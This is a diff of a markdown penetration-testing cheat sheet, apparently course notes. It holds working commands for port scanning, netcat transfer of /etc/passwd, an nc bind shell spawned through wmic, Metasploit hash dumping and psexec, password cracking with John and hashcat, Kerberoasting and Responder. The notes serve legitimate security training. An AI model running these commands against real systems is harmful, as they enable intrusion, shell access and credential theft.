@@ -13,9 +13,8 @@ exfiltool
 
 # Chapter 2 Scanning
 
-## Nmap
 
-## Other Scanning tools   
+#### Other Scanning tools   
 ```
 masscan -0-65535 --rate 1500 10.10.10.0/24
 ```
@@ -27,8 +26,22 @@ tcpdump -nn tcp and port 80 and host 10.10.10.10
 ```
 echo "" | nc -nvw2 10.10.10.60 20-80
 ```
+#### IPv6 scans
 
-### Powershell commands
+multicast scan   
+```
+ping6 -I eth0 ff02::1
+```   
+#### Netcat
+
+Transfer files
+```
+nc -nvlp 8080 < /etc/passwd
+
+nc -nv YOUR_LINUX_IP_ADDRESS 8080 > passwd.txt
+```
+
+## Powershell commands
 
 #### Ping scan
 
@@ -47,20 +60,6 @@ echo "" | nc -nvw2 10.10.10.60 20-80
 ```
 
 
-### IPv6 scans
-
-multicast scan   
-```
-ping6 -I eth0 ff02::1
-```   
-### Netcat
-
-Transfer files
-```
-nc -nvlp 8080 < /etc/passwd
-
-nc -nv YOUR_LINUX_IP_ADDRESS 8080 > passwd.txt
-```
 
 # Chapter 3 Exploitation
 
@@ -97,7 +96,7 @@ wmic process call create "c:\tools\nc.exe -l -p 4444 -e cmd.exe"
 ```
 # Chapter 4
 
-### Hydra 
+#### Hydra 
 
 ```
 cat /opt/password.lst | pw-inspector -m 6 -n -u -l -c 2 > /tmp/custom.lst
@@ -106,7 +105,7 @@ cat /opt/password.lst | pw-inspector -m 6 -n -u -l -c 2 > /tmp/custom.lst
 xhydra
 ```
 
-### MSF
+#### MSF
 
 ```
 run post/windows/gather/smart_hashdump
@@ -128,7 +127,7 @@ msf5 exploit(windows/smb/psexec) > set ReverseAllowProxy true
 ```
 MSF usage of ssh -D proxy
 
-## John
+#### John
 
 ```
 john --show sam.txt
@@ -148,7 +147,7 @@ john --format=nt sam.txt
 unshadow passwd_copy shadow_copy > combined.txt
 john combined.txt --format=crypt
 ```
-## Hashcat
+#### Hashcat
 ```
 hashcat -w 3 -a 0 -m 3000 -o cracked.txt coursefiles/sam.txt /opt/password.lst
 ```
@@ -159,11 +158,11 @@ hashcat -w 3 -a 0 -m 3000 -o cracked.txt coursefiles/sam.txt names.txt /opt/pass
 hashcat -w 3 -a 0 -m 1800 -o cracked.txt shadow_copy names.txt clear.txt /opt/password.lst -r /usr/local/share/doc/hashcat/rules/best64.rule
 ```
 
-## LM to NTLM   
+#### LM to NTLM   
 ```
 /opt/metasploit-framework/tools/password/lm2ntcrack.rb -t NTLM -p INTERNET12 -a 1274D7B32A9ABDDA01A5067FE9FBB32B
 ```
-## Pulling Creds from .pcap
+#### Pulling Creds from .pcap
 ```
 ./Pcredz -v -f /tmp/winauth.pcap
 ```
@@ -179,7 +178,7 @@ or
 ```
 hashcat -m 5600 --potfile-path ~/.hashcat/hashcat.potfile --show --outfile-format 2 hash.txt
 ```
-### VoIP
+#### VoIP
 
 In wireshark dropdown menues  telephone > RTP > RTP Streams   
 then select stream and click Analyze   
@@ -188,7 +187,7 @@ Play Streams
 
 # Chapter 5
 
-## Kerberoasting
+#### Kerberoasting
 
 ```
 cscript.exe GetUserSPNs.vbs
@@ -211,7 +210,7 @@ Crack ticket with tgsrepcrack.py from TIM Medin `https://github.com/nidem/kerber
 python tgsrepcrack.py example.dict C:\Users\sec560\Desktop\1-40a10000-john.doe@svcsqlserver~dc01.sec560.local~1433-SEC560.LOCAL.kirbi
 ```
 
-## Responder
+#### Responder
 
 ```
 Responder.py -I eth0
